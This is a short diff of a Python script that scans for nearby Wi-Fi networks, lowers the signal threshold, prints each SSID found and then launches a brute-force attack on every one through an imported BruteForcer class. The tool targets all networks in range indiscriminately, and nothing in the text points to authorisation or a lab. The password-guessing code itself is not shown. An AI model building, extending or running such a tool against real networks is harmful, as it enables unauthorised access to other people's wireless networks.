@@ -2,7 +2,7 @@ import subprocess
 import time
 from brute_forcer import BruteForcer  # assumes your file is named brute_wifi.py
 
-SIGNAL_THRESHOLD = -80  # dBm; ignore very weak signals
+SIGNAL_THRESHOLD = -85  # dBm; ignore very weak signals
 
 
 def run_cmd(cmd):
@@ -59,9 +59,12 @@ def main():
     # Remove duplicates
     unique_ssids = list({s[0]: s for s in scanned}.values())
     print(f"✅ Found {len(unique_ssids)} candidate networks to try.")
+    for ssid, signal in unique_ssids:
+        print(f"📡 SSID: {ssid}, Signal: {signal} dBm")
+    print("\n🔍 Starting brute-force attacks on found networks...\n")
 
     for ssid, signal in unique_ssids:
-        print(f"\n🚀 Attacking SSID: {ssid} (Signal: {signal} dBm)")
+        print(f"\n🚀 Attacking SSID: {ssid} (Signal: {signal} dBm)\n")
 
         attacker = BruteForcer(ssid)
         attacker.main()
